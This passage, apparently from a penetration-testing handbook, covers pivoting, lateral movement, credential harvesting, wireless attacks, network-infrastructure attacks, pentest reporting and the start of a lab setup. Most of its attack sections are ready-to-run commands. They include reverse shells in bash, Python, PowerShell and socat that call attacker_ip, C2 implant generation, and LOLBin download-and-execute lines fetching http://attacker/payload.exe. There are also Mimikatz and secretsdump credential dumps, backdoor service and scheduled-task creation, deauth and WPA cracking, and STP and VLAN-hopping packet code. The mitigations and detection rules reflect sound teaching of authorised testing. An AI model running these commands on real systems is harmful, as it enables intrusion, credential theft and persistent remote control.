dhcp6_server eth0 2001:db8::1/64 dns=2001:db8::evil
```

### 5.7 Rogue AP — Evil Twin

```bash
# Using hostapd-wpe
# /etc/hostapd-wpe/hostapd-wpe.conf:
interface=wlan0
driver=nl80211
ssid=TargetCorporateWifi
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Start evil twin
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Using WiFi Pineapple
# Web interface → PineAP → enable broadcasting
# Clone target SSID, stronger signal wins

# Using bettercap
bettercap -iface wlan0
wifi.recon on
wifi.ap    # Start access point module
```

### 5.8 Mitigations Summary

| Attack | Mitigation |
|--------|-----------|
| ARP Spoofing | Dynamic ARP Inspection (DAI), static ARP entries, 802.1X |
| LLMNR/NBT-NS | Disable LLMNR (GPO), disable NBT-NS (network adapter settings) |
| DHCPv6 | RA Guard, DHCPv6 Guard, disable IPv6 if unused |
| WPAD | Disable WPAD auto-detection, deploy explicit PAC via GPO |
| SSL Strip | HSTS preload, HSTS headers on all domains |
| Rogue AP | Wireless IDS (WIDS), 802.1X-EAP-TLS, certificate pinning |
| NDP Spoofing | RA Guard (RFC 6105), SEND (Secure Neighbor Discovery) |

---

## 6. Post-Exploitation and Pivoting

### 6.1 Establishing Persistence

#### SSH Tunnels

```bash
# Local port forward (access remote service through tunnel)
ssh -L 8080:internal_target:80 user@pivot_host

# Remote port forward (expose local service to remote network)
ssh -R 9090:127.0.0.1:4444 user@pivot_host

# Dynamic SOCKS proxy (full network access)
ssh -D 1080 user@pivot_host
# Then configure proxychains: socks5 127.0.0.1 1080

# SSH tunnel with keep-alive and background
ssh -fNT -o ServerAliveInterval=60 -D 1080 user@pivot_host
```

#### Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat listener
nc -lvnp 4444

# Socat encrypted reverse shell
# Listener:
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -
# Target:
socat OPENSSL:attacker_ip:4444,verify=0 EXEC:/bin/bash
```

#### Implants

```bash
# Sliver C2 framework
# Generate implant
sliver > generate --mtls attacker_ip:443 --os windows --arch amd64 --save implant.exe

# HTTP C2 implant
sliver > generate --http attacker_ip --os linux --arch amd64 --save implant

# Start listener
sliver > mtls --lport 443
sliver > http --lport 80

# Cobalt Strike (commercial)
# Generate beacon
# Attacks → Packages → Windows Executable (S)
# Choose listener, output stageless beacon

# Havoc C2 (open source Cobalt Strike alternative)
# Generate demon agent from teamserver
```

### 6.2 Pivoting Techniques

#### SSH Port Forwarding

```bash
# Access internal web server through compromised host
ssh -L 8080:10.10.10.5:80 user@compromised_host
# Now access http://127.0.0.1:8080

# Access multiple internal services
ssh -L 3389:10.10.10.5:3389 -L 445:10.10.10.5:445 user@compromised_host

# Double pivot (through two hosts)
ssh -J user@host1 user@host2
# Or with explicit port forwarding chain
ssh -L 2222:host2:22 user@host1
ssh -L 8080:internal:80 -p 2222 user@127.0.0.1
```

#### SOCKS Proxying

```bash
# SSH SOCKS proxy
ssh -D 9050 user@compromised_host

# Proxychains configuration (/etc/proxychains4.conf)
[ProxyList]
socks5 127.0.0.1 9050

# Use any tool through the proxy
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.5
proxychains crackmapexec smb 10.10.10.0/24
```

#### Chisel

```bash
# On attacker (server mode):
chisel server --reverse --port 8080

# On compromised host (client, reverse SOCKS):
chisel client attacker_ip:8080 R:1080:socks

# On attacker, use SOCKS proxy at 127.0.0.1:1080
proxychains nmap -sT -Pn 10.10.10.0/24

# Forward specific port
chisel client attacker_ip:8080 R:8888:10.10.10.5:80

# Multiple forwards
chisel client attacker_ip:8080 R:3389:10.10.10.5:3389 R:445:10.10.10.6:445
```

#### Ligolo-ng

```bash
# On attacker (proxy mode):
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host (agent):
ligolo-agent -connect attacker_ip:11601 -retry -ignore-cert

# In ligolo proxy interface:
ligolo-ng » session
ligolo-ng » ifconfig         # Shows internal network
ligolo-ng » start            # Start tunnel

# On attacker, add route to internal network:
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal network directly (no proxychains needed!)
nmap -sT -Pn 10.10.10.0/24
curl http://10.10.10.5
```

### 6.3 Lateral Movement

#### Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 \
          administrator@target

# Impacket wmiexec
wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@target

# Impacket smbexec
smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@target

# Mimikatz pass-the-hash
sekurlsa::pth /user:administrator /domain:target.local \
              /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe

# xfreerdp with hash
xfreerdp /v:target /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4
```

#### WMI Execution

```bash
# Impacket
wmiexec.py domain/user:password@target

# WMI via PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\out.txt" -ComputerName target -Credential $cred

# DCOM execution (alternative to WMI)
dcomexec.py domain/user:password@target
```

#### PsExec

```bash
# Impacket PsExec (creates service, runs as SYSTEM)
psexec.py domain/user:password@target

# Metasploit PsExec
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser administrator
set SMBPass password
run

# Sysinternals PsExec
PsExec.exe \\target -u domain\user -p password cmd.exe
PsExec.exe \\target -s cmd.exe    # As SYSTEM
```

#### WinRM

```bash
# Evil-WinRM
evil-winrm -i target -u administrator -p 'Password1'
evil-winrm -i target -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName target -Credential $cred
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# CrackMapExec WinRM
crackmapexec winrm 192.168.1.0/24 -u user -p password
crackmapexec winrm target -u user -p password -x "whoami"
```

### 6.4 Credential Harvesting

#### Mimikatz

```powershell
# Dump credentials from LSASS
privilege::debug
sekurlsa::logonpasswords

# Dump Kerberos tickets
sekurlsa::tickets /export

# Extract NTDS.dit hashes (on domain controller)
lsadump::dcsync /domain:target.local /all /csv

# DCSync specific user
lsadump::dcsync /domain:target.local /user:krbtgt

# Dump SAM database
lsadump::sam

# Extract cached credentials
lsadump::cache

# Golden ticket
kerberos::golden /user:administrator /domain:target.local \
                 /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver ticket
kerberos::golden /user:administrator /domain:target.local \
                 /sid:S-1-5-21-... /target:server.target.local \
                 /service:cifs /rc4:service_hash /ptt
```

#### LaZagne

```bash
# All modules
lazagne.exe all

# Specific module
lazagne.exe browsers
lazagne.exe sysadmin
lazagne.exe databases
lazagne.exe wifi

# Linux
python3 laZagne.py all
```

#### Secretsdump (Impacket)

```bash
# Remote NTDS extraction via DCSync
secretsdump.py domain/user:password@dc_ip

# Using hashes
secretsdump.py -hashes :ntlm_hash domain/user@dc_ip

# Local SAM dump
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Extract from NTDS.dit file
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Just DCSync specific accounts
secretsdump.py -just-dc-user krbtgt domain/user:password@dc_ip
```

### 6.5 Token Impersonation

```powershell
# Meterpreter
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Windows token manipulation (manual)
# SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege required
# Potato attacks (JuicyPotato, SweetPotato, PrintSpoofer, GodPotato)

# PrintSpoofer (Windows 10/Server 2019)
PrintSpoofer.exe -i -c "cmd /c whoami"

# GodPotato (works on latest Windows versions)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (Windows Server 2016 and earlier)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
```

### 6.6 Living-off-the-Land Binaries (LOLBins)

```cmd
:: File download
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
bitsadmin /transfer job /download /priority foreground http://attacker/payload.exe C:\payload.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\payload.exe')"

:: Execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject('WScript.Shell');w.run('calc');window.close()")
mshta http://attacker/payload.hta
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

:: Reconnaissance
nltest /dclist:domain.local
net group "Domain Admins" /domain
dsquery user -name *admin*
cmdkey /list

:: Credential access
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
ntdsutil "ac in ntds" "ifm" "create full C:\ntds_dump" q q

:: Lateral movement (without dropping tools)
wmic /node:target process call create "cmd.exe /c whoami > C:\out.txt"
schtasks /create /s target /tn backdoor /tr "cmd /c payload" /sc once /st 00:00 /ru SYSTEM
sc \\target create svcbackdoor binpath= "cmd /c payload" start= auto
winrs -r:target cmd.exe
```

---

## 7. Wireless Network Testing

### 7.1 WPA2/WPA3 Assessment

#### WPA2-PSK Attack

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth client to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Crack handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Hashcat (GPU accelerated)
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt

# Alternative: PMKID capture (no client needed)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng \
            --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
hcxpcapngtool -o pmkid.hash pmkid.pcapng
hashcat -m 22000 pmkid.hash rockyou.txt
```

#### WPA3 Assessment

WPA3 uses SAE (Simultaneous Authentication of Equals) based on Dragonfly handshake, making offline dictionary attacks infeasible. Testing focuses on:

- **Transition mode vulnerabilities** — If WPA2/WPA3 mixed mode is enabled, downgrade attacks are possible
- **Dragonblood vulnerabilities** (CVE-2019-9494 through CVE-2019-9499) — Side-channel leaks in some implementations
- **Implementation bugs** — Timing attacks against SAE

```bash
# Dragonblood testing
# Check if transition mode is enabled
airodump-ng wlan0mon    # Look for WPA2/WPA3 in the ENC column

# Downgrade attack (force WPA2 connection)
# Create evil twin with WPA2-only, capture handshake

# SAE timing attack (research-grade)
# Requires modified wpa_supplicant for timing measurement
```

### 7.2 Evil Twin / Karma Attacks

```bash
# Hostapd-mana (enhanced with karma)
# /etc/hostapd-mana/hostapd-mana.conf:
interface=wlan0
driver=nl80211
ssid=FreeWiFi
channel=1
enable_mana=1
mana_loud=1

hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# Using Fluxion (automated evil twin + captive portal)
fluxion

# Bettercap WiFi
bettercap -iface wlan0
wifi.recon on
wifi.deauth AA:BB:CC:DD:EE:FF    # Kick clients off real AP
# Clients reconnect to evil twin (stronger signal)
```

### 7.3 PMKID Capture and Cracking

```bash
# PMKID capture (clientless attack, WPA2 only)
# Using hcxdumptool
hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1

# Target specific AP
hcxdumptool -i wlan0mon -o outfile.pcapng \
            --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 outfile.pcapng

# Crack with hashcat
hashcat -m 22000 hash.hc22000 -a 0 rockyou.txt
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d    # 8-digit PIN
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt ?d?d?d?d  # Hybrid

# Using hashcat rules for efficiency
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 7.4 Deauthentication Attacks

```bash
# Single client deauth
aireplay-ng -0 10 -a AP_BSSID -c CLIENT_MAC wlan0mon

# Broadcast deauth (all clients)
aireplay-ng -0 0 -a AP_BSSID wlan0mon    # 0 = continuous

# MDK4 for mass deauth
mdk4 wlan0mon d -B target_bssids.txt

# Bettercap deauth
bettercap -iface wlan0
wifi.recon on
wifi.deauth AA:BB:CC:DD:EE:FF

# 802.11w (Management Frame Protection) bypass
# If PMF is not enforced (optional mode), deauth still works
# If mandatory PMF, deauth is not possible via standard frames
# Channel switch announcement (CSA) attack may still work
```

### 7.5 WPA-Enterprise Attacks

#### EAP Type Attacks

```bash
# Evil RADIUS server (hostapd-wpe)
# Captures EAP credentials for PEAP/TTLS
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Credentials appear in stdout:
# mschapv2: username:DOMAIN\user
# mschapv2: challenge:...
# mschapv2: response:...

# Crack MSCHAPv2 response
# Convert to hashcat format
# hashcat -m 5500 (NetNTLMv1) or custom format

# asleap — crack LEAP (legacy, still found)
asleap -r capture.pcap -W wordlist.txt

# EAP-TLS downgrade
# If supplicant doesn't validate server certificate:
# Evil twin presents self-signed cert, captures TLS session
```

#### Evil RADIUS Server

```bash
# FreeRADIUS-WPE configuration
# Set up FreeRADIUS to accept any credentials
# Log all authentication attempts

# hostapd-wpe captures:
# - PEAP credentials (inner MSCHAPv2)
# - EAP-TTLS/PAP credentials (plaintext!)
# - EAP-TTLS/MSCHAPv2 credentials (hashable)

# Mitigation test: verify client certificate validation
# If client accepts any server cert → vulnerable to evil twin + evil RADIUS
```

### 7.6 Bluetooth/BLE Reconnaissance

```bash
# Scan for Bluetooth devices
hcitool scan
hcitool lescan

# Bluetooth service discovery
sdptool browse XX:XX:XX:XX:XX:XX

# BLE enumeration
gatttool -b XX:XX:XX:XX:XX:XX --char-read -a 0x0001
bettercap -eval "ble.recon on"

# BlueBorne vulnerability scanning
# Check for CVE-2017-0781 through CVE-2017-0785

# KNOB attack testing (Key Negotiation of Bluetooth)
# Forces minimum encryption key length

# BLE sniffing
# Using Ubertooth One:
ubertooth-btle -f -t XX:XX:XX:XX:XX:XX
```

### 7.7 Rogue AP Detection

From a defensive assessment perspective:

```bash
# Scan for unauthorized APs
airodump-ng wlan0mon --manufacturer
# Compare against authorized AP list (BSSID whitelist)

# Detect evil twins (same SSID, different BSSID or channel)
airodump-ng wlan0mon --essid "Corporate_SSID"

# Check for KARMA/loud mode APs (responding to all probes)
# Monitor probe responses for impossible SSID matches

# WIDS tools: Kismet (open source), AirMagnet (commercial)
kismet -c wlan0mon
```

### 7.8 Tools Summary

| Tool | Purpose |
|------|---------|
| aircrack-ng suite | WPA/WPA2 cracking, packet injection, monitoring |
| bettercap | WiFi MITM, deauth, evil twin, BLE |
| WiFi Pineapple | Hardware evil twin, karma, PineAP |
| hcxdumptool | PMKID capture, WiFi audit |
| hostapd-wpe | Evil RADIUS, WPA-Enterprise attacks |
| Kismet | Wireless IDS, detection, monitoring |
| Fluxion | Automated evil twin with captive portal |
| Wifite | Automated WPA/WPS cracking |
| Reaver | WPS PIN brute force |
| MDK4 | Deauth, beacon flood, authentication DoS |

---

## 8. Network Infrastructure Attacks

### 8.1 VLAN Hopping

#### Double Tagging

Exploits native VLAN behavior on trunk ports:

```bash
# Requirements:
# - Attacker on native VLAN of a trunk port
# - Target VLAN known

# Using Scapy (Python)
from scapy.all import *

# Craft double-tagged frame
# Outer tag: native VLAN (stripped by first switch)
# Inner tag: target VLAN (forwarded by second switch)
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=1) / \        # Native VLAN (stripped)
         Dot1Q(vlan=100) / \      # Target VLAN
         IP(dst="10.100.0.1") / \
         ICMP()
sendp(packet, iface="eth0")

# Using yersinia
yersinia dot1q -attack 1 -interface eth0
```

#### Switch Spoofing

```bash
# Negotiate trunk link with switch (DTP - Dynamic Trunking Protocol)
# Using yersinia
yersinia dtp -attack 1 -interface eth0

# Using Scapy — send DTP frames to become trunk
# Once trunk is established, access all VLANs
# Add VLAN interfaces:
modprobe 8021q
vconfig add eth0 100
ifconfig eth0.100 10.100.0.50 netmask 255.255.255.0 up
```

**Mitigation:**
- Disable DTP on all access ports (`switchport nonegotiate`)
- Set all access ports to specific access VLAN (`switchport mode access`)
- Use a dedicated native VLAN that carries no user traffic
- Implement private VLANs where applicable

### 8.2 STP Attacks — Root Bridge Takeover

```bash
# Become root bridge by advertising lower priority
# Using yersinia
yersinia stp -attack 4 -interface eth0

# Using Scapy
from scapy.all import *
# Send BPDU with priority 0 (lowest = becomes root)
frame = Ether(dst="01:80:c2:00:00:00") / \
        LLC() / \
        STP(bpdutype=0x00, rootpriority=0, bridgepriority=0)
sendp(frame, iface="eth0", loop=1, inter=2)

# Impact: All traffic flows through attacker (full MITM)
# Can cause network instability/outage
```

**Mitigation:**
- BPDU Guard on access ports
- Root Guard on designated ports
- BPDU Filter (cautious use)
- Enable STP toolkit: Loop Guard, UDLD

### 8.3 Route Injection

#### BGP Hijacking (External Testing Context)

```bash
# BGP hijacking requires access to a BGP speaker
# In pentest context: test if BGP peers authenticate

# Check for unauthenticated BGP sessions
nmap -p 179 --script=bgp-info target_router

# If TCP MD5 signature not enforced:
# Inject more-specific prefix to hijack traffic

# Tools: ExaBGP, GoBGP for testing
# ExaBGP configuration for route injection:
process announce-routes {
    run /usr/bin/python3 announce.py;
}
neighbor 192.168.1.1 {
    router-id 192.168.1.50;
    local-address 192.168.1.50;
    local-as 65000;
    peer-as 65001;
    announce {
        ipv4 unicast;
    }
}
```

#### OSPF Route Injection

```bash
# Using Loki (OSPF attack tool)
loki -i eth0

# Or using Scapy to craft OSPF LSA updates
# Inject route that redirects traffic through attacker
# Requires being on the same OSPF area

# FRRouting for OSPF injection testing
# Configure as OSPF neighbor, advertise malicious routes
```

#### EIGRP Attacks

```bash
# EIGRP uses no authentication by default on many networks
# Using Loki or custom tools to:
# 1. Join EIGRP autonomous system
# 2. Advertise better routes (lower metric)
# 3. Redirect traffic through attacker

# Mitigations:
# - OSPF/EIGRP authentication (MD5 or SHA)
# - BGP: TCP MD5, RPKI, prefix filtering
# - Route filtering at all edges
```

### 8.4 VPN Exploitation

#### IKE Aggressive Mode

```bash
# Scan for IKE VPN endpoints
nmap -sU -p 500,4500 target

# IKE aggressive mode PSK cracking
ike-scan --aggressive --id=vpngroup target
# Captures hashed PSK in aggressive mode exchange

# Crack with psk-crack
psk-crack -d wordlist.txt handshake.psk

# Using ikeforce for group enumeration
ikeforce.py target -e -w wordlists/groupnames.txt

# Metasploit
use auxiliary/scanner/ike/cisco_ike_benigncertain
set RHOSTS target
run
```

#### VPN PSK Cracking

```bash
# Capture IKE aggressive mode exchange
ike-scan -A -n groupname target > ike_capture.txt

# Extract hash and crack
# hashcat -m 5300 (IKEv1)
# hashcat -m 5400 (IKEv2)

# For Cisco VPN:
# Extract group PSK from .pcf files (trivially decoded — Type 7)
cisco-decrypt enc_password_here
```

### 8.5 MPLS Security Testing

```bash
# MPLS label manipulation
# If on a PE router or having access to MPLS domain:

# Label stack pushing (access other VRFs)
# Craft packets with specific MPLS labels to cross VRF boundaries

# MPLS traceroute (mapping label space)
mpls traceroute target_prefix

# TTL-expiry attacks (force MPLS routers to reveal internal topology)
traceroute -M -n target

# VRF hopping via route leaking
# Test: Can traffic from one VRF reach another? (segmentation failure)
```

### 8.6 SDN/OpenFlow Exploitation

```bash
# OpenFlow controller discovery
nmap -p 6633,6653 controller_ip

# If controller API exposed:
curl http://controller:8080/wm/core/controller/switches/json
curl http://controller:8080/wm/core/controller/summary/json

# Flow table manipulation (if write access):
# Install flow rule redirecting traffic
curl -X POST http://controller:8080/wm/staticflowentrypusher/json \
  -d '{"switch":"00:00:00:00:00:00:00:01",
       "name":"evil_flow",
       "priority":"32768",
       "in_port":"1",
       "active":"true",
       "actions":"output=2"}'

# OpenFlow fingerprinting
nmap --script=openflow-info -p 6633,6653 target
```

### 8.7 Network Device Firmware Exploitation

```bash
# Download firmware from device or vendor site
# Extract filesystem
binwalk -e firmware.bin
# Or:
firmware-mod-kit/extract-firmware.sh firmware.bin

# Analyze extracted filesystem
find _firmware.bin.extracted/ -name "*.conf" -exec grep -l "password" {} \;
find _firmware.bin.extracted/ -name "shadow" -o -name "passwd"
strings _firmware.bin.extracted/squashfs-root/bin/* | grep -i "hardcoded"

# Look for:
# - Hardcoded credentials
# - Debug interfaces (UART, JTAG)
# - Unsigned update mechanisms
# - Known vulnerable library versions
# - Private keys embedded in firmware

# Hardware attacks:
# - UART console access (serial connection, often root shell)
# - JTAG debugging (read/write flash, bypass authentication)
# - SPI flash dump (extract firmware offline)

# Tools: binwalk, firmware-mod-kit, FACT, Ghidra (for binary analysis)
```

---

## 9. Reporting and Remediation

### 9.1 Executive Summary

The executive summary is the most-read section of any pentest report. It must convey risk in business terms without technical jargon.

**Structure:**

1. **Engagement overview** — What was tested, when, by whom
2. **Scope summary** — In-scope assets (high level)
3. **Risk rating** — Overall organizational risk posture (Critical/High/Medium/Low)
4. **Key findings summary** — 3-5 most impactful findings in business language
5. **Strategic recommendations** — High-level remediation themes
6. **Positive observations** — What was done well (builds trust, context)

**Example executive summary excerpt:**

> During the assessment period (2025-03-15 to 2025-03-29), the testing team achieved full domain administrative access within 4 hours of gaining network access. This was accomplished by exploiting unpatched systems and weak authentication controls. An attacker with similar access could exfiltrate customer data, deploy ransomware, or disrupt business operations.
>
> The most critical finding is the ability to compromise the entire Active Directory domain from any internal network position without requiring any pre-existing credentials. This represents an existential risk to business continuity.

### 9.2 Attack Narrative

The attack narrative tells the story of the engagement chronologically, showing the chain of vulnerabilities exploited:

```markdown
## Attack Narrative

### Initial Access (Day 1, 09:00 UTC)

Connected to the network via provided Ethernet drop in the visitor lobby.
DHCP assigned address 10.10.5.203 on VLAN 50 (Guest).

### Network Reconnaissance (Day 1, 09:15 UTC)

Passive listening with Responder identified LLMNR/NBT-NS broadcast traffic
from the corporate VLAN (10.10.1.0/24), indicating insufficient network
segmentation between guest and corporate VLANs.

### Credential Capture (Day 1, 09:45 UTC)

Poisoned LLMNR request for \\fileserver01, capturing NTLMv2 hash for
CORP\j.smith. Hash cracked offline in 12 minutes using hashcat
(password: Summer2024!).

### Lateral Movement (Day 1, 10:30 UTC)

Authenticated to workstation WKS-042 (10.10.1.42) via SMB using
j.smith credentials. Extracted cached domain credentials using
secretsdump, recovering NTLM hash for CORP\svc-backup (service account
with Domain Admin privileges).

### Domain Compromise (Day 1, 11:15 UTC)

Performed DCSync attack against DC01 (10.10.1.10) using svc-backup
credentials, extracting NTLM hashes for all domain accounts including
the krbtgt account.

### Impact Demonstration (Day 1, 14:00 UTC)

Created golden ticket for persistence. Accessed finance share
(\\fileserver02\finance$) containing 47,000 customer records.
Demonstrated ability to modify Group Policy for ransomware deployment
simulation (non-destructive — wrote benign test file to SYSVOL).
```

### 9.3 Finding Template

```markdown
## Finding: [ID] — [Title]

### Description
[Clear, technical description of the vulnerability]

### Severity
- **CVSS v3.1 Score:** [X.X] ([Critical/High/Medium/Low])
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **Business Impact:** [Describe real-world impact to the organization]

### Affected Assets
| Asset | IP/Hostname | Service | Notes |
|-------|-------------|---------|-------|
| DC01 | 10.10.1.10 | SMB/445 | Domain Controller |
| WKS-042 | 10.10.1.42 | RDP/3389 | Finance workstation |

### Evidence

**Step 1:** Initial scan identified SMB service
```
nmap -sV -p 445 10.10.1.10
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Windows Server 2019 Standard
```

**Step 2:** Exploitation
[Screenshot or command output proving exploitation]

**Step 3:** Impact demonstration
[Evidence of access gained]

### Remediation

**Immediate (0-7 days):**
- Apply patch MS17-010 to all affected systems
- Disable SMBv1 protocol via Group Policy

**Short-term (7-30 days):**
- Implement network segmentation between workstation and server VLANs
- Deploy endpoint detection and response (EDR) solution

**Long-term (30-90 days):**
- Implement privileged access workstations (PAW) for domain admin activities
- Deploy MFA for all administrative access

### References
- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [MITRE ATT&CK T1210](https://attack.mitre.org/techniques/T1210/)
```

### 9.4 Prioritized Remediation Roadmap

```markdown
## Remediation Roadmap

### Phase 1: Critical (0-7 Days) — Stop Active Bleeding

| # | Finding | Action | Owner | Effort |
|---|---------|--------|-------|--------|
| 1 | F-001 | Patch MS17-010 on 14 hosts | Infra Team | 4h |
| 2 | F-003 | Disable LLMNR/NBT-NS via GPO | AD Team | 1h |
| 3 | F-005 | Reset svc-backup password, remove DA rights | Security | 2h |
| 4 | F-008 | Enable SMB signing domain-wide | AD Team | 2h |

### Phase 2: High (7-30 Days) — Reduce Attack Surface

| # | Finding | Action | Owner | Effort |
|---|---------|--------|-------|--------|
| 5 | F-002 | Segment guest from corporate VLAN | Network | 8h |
| 6 | F-004 | Implement LAPS for local admin passwords | AD Team | 16h |
| 7 | F-006 | Deploy EDR to all workstations | Security | 40h |
| 8 | F-009 | Enforce NTLMv2 minimum, disable LM | AD Team | 4h |

### Phase 3: Medium (30-90 Days) — Harden Architecture

| # | Finding | Action | Owner | Effort |
|---|---------|--------|-------|--------|
| 9 | F-007 | Implement tiered admin model | AD Team | 80h |
| 10 | F-010 | Deploy PAW for Tier 0 admin | Security | 40h |
| 11 | F-011 | Implement network detection (NDR) | Security | 60h |
| 12 | F-012 | Review and harden service accounts | AD Team | 24h |

### Phase 4: Long-Term (90+ Days) — Mature Security Program

- Implement Zero Trust architecture
- Deploy deception technology (honeypots/honeytokens)
- Establish continuous pentesting program
- Mature SOC detection capabilities with purple team exercises
```

### 9.5 Retesting Methodology

```markdown
## Retesting Protocol

### Scope
Retest covers only findings from the original engagement. New testing
is out of scope unless contracted separately.

### Process
1. Client confirms remediation is complete for specific findings
2. Tester validates remediation for each finding individually
3. Each finding receives one of:
   - **RESOLVED** — Vulnerability no longer present
   - **PARTIALLY RESOLVED** — Risk reduced but not eliminated
   - **UNRESOLVED** — Vulnerability still exploitable
   - **RISK ACCEPTED** — Client formally accepts residual risk

### Validation Methods
- Re-execute original exploitation steps
- Verify patch installation (version check)
- Confirm configuration changes (GPO, firewall rules)
- Test compensating controls if direct fix not applied

### Deliverable
Updated report with retest results column added to findings table.
```

### 9.6 Knowledge Transfer to Blue Team

```markdown
## Blue Team Knowledge Transfer

### Detection Opportunities

For each attack technique used, provide detection guidance:

| Technique | Log Source | Detection Logic |
|-----------|-----------|-----------------|
| LLMNR Poisoning | Network flow data | Unusual host responding to multicast queries |
| DCSync | Windows Security Log | Event ID 4662 with replication rights on domain object |
| Pass-the-Hash | Windows Security Log | Event ID 4624 Type 3 + Event ID 4776 with NTLM |
| Kerberoasting | Windows Security Log | Event ID 4769 with RC4 encryption (0x17) |
| Golden Ticket | Windows Security Log | Event ID 4769 with TGT anomalies (lifetime, encryption) |

### Sigma Rules Provided

Deliver Sigma rules for critical detections:

```yaml
title: DCSync Attack Detected
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        AccessMask: '0x100'
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
    filter:
        SubjectUserName|endswith: '$'
        SubjectUserName|contains: 'DC'
    condition: selection and not filter
level: critical
```

### IOC Sharing
- All IPs/domains used during testing
- Hashes of any tools deployed
- Timestamps of all activities (UTC)
- Network captures (filtered to pentest traffic only)

### Recommendations for Monitoring
- Priority alert configuration for techniques used
- Log retention requirements for forensic capability
- Suggested tabletop exercises based on attack narrative
```

---

## 10. Lab: Complete Network Pentest Engagement

### 10.1 Lab Environment Setup

#### Network Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Lab Network Topology                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  VLAN 10 (Corporate)        VLAN 20 (Servers)                    │
│  ┌──────────┐               ┌───────────────┐                   │
│  │ WKS-01   │               │ DC01          │                   │
│  │ Win 10   │               │ Win Srv 2019  │                   │
│  │ .1.100   │               │ .2.10         │                   │
│  └──────────┘               └───────────────┘                   │
│  ┌──────────┐               ┌───────────────┐                   │
│  │ WKS-02   │               │ FS01          │                   │
│  │ Win 10   │               │ Win Srv 2019  │                   │
│  │ .1.101   │               │ .2.20         │                   │
